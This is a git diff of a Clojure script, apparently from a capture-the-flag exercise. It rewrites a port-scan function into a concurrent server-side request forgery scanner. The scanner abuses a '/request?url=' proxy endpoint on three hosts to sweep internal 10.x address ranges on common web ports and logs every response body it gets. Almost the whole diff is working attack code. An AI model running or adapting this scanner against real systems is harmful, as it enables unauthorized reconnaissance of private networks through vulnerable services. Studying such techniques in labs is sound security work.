@@ -1,29 +1,46 @@
 (ns script.admin
   (:require
+    [clojure.string :as str]
     [clojure.tools.logging :as log]
-    [clj-commons.byte-streams :as bs]
     [aleph.http :as http]
-    [manifold.deferred :as d])
+    [manifold.deferred :as d]
+    [io.github.sokrato.ctf.threads :as t]
+    [clj-commons.byte-streams :as bs])
   (:gen-class))
 
 (def ^:dynamic *host* "10.174.253.209")
+(def ret (volatile! nil))
 
-(defn poke [port]
-  (try
-    (let [resp @(http/get
-                  (format "http://%s:65006/request" *host*)
-                  {:query-params {"url" (format "http://localhost:%s" port)}})]
-      (log/info "OK" port resp)
-      port)
-    (catch Exception ex
-      (log/info "failed" port)
-      (when-not (= "status: 500" (ex-message ex))
-        (log/info (bs/to-string (-> (ex-data ex) :body)))))))
+;; http://10.174.253.209:65006/request?url=http://localhost:65006/
+(defn poke [[server host port]]
+  (log/info "poking" server host port)
+  @(->
+     (d/chain
+       (http/get
+         (format "http://%s/request?url=http://%s:%s" server host port)
+         {:as :text})
+       :body
+       (fn [p]
+         (log/info "found:" server host port (bs/to-string p))))
+     (d/timeout! 1200)
+     (d/catch Exception (constantly nil))))
 
-(defn scan
-  ([port] (scan port 65535))
-  ([port max-port]
-   (when (< port max-port)
-     (if (poke port)
-       port
-       (recur (inc port) max-port)))))
+(defn scan []
+  (let [wg (t/workgroup poke 4)
+        ports [80 8080 8088 8888 5000]]
+    (t/add-all
+      wg
+      (for [ip (range 1 255)
+            p ports]
+        ["10.0.79.181:65006" (format "10.0.79.%s" ip) p]))
+    (t/add-all
+      wg
+      (for [ip (range 1 255)
+            p ports]
+        ["10.174.250.229:65006" (format "10.174.250.%s" ip) p]))
+    (t/add-all
+      wg
+      (for [ip (range 1 255)
+            p ports]
+        ["10.174.253.209:65006" (format "10.174.253.%s" ip) p]))
+    (t/join wg)))
